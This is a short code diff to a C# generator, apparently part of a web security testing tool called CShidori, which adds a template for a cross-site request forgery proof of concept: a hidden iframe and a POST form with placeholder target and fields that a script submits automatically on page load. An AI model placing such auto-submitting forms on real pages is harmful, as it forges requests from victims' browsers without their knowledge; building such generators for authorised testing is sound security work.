@@ -52,7 +52,13 @@ namespace CShidori.Generator
         {
             Dictionary<string, string> dparameters = new Dictionary<string, string>();
 
-            string csrf = string.Join("\n", BadStrings.Output);
+            string csrf = @"
+ <iframe style=""display: none"" name=""csrf-frame""></iframe>
+ <form method=""POST"" action=""§TARGET§"" target=""csrf-frame"" id=""csrf-form"">
+ §PARAMETERS§    <input type=""submit"" value=""submit"">
+ </form>
+ <script>document.getElementById(""csrf-form"").submit()</script>           
+            ";
 
             string FormParams = @"     <input type=""hidden"" name=""§NAME§"" value=""§VAMUE§"">
 ";
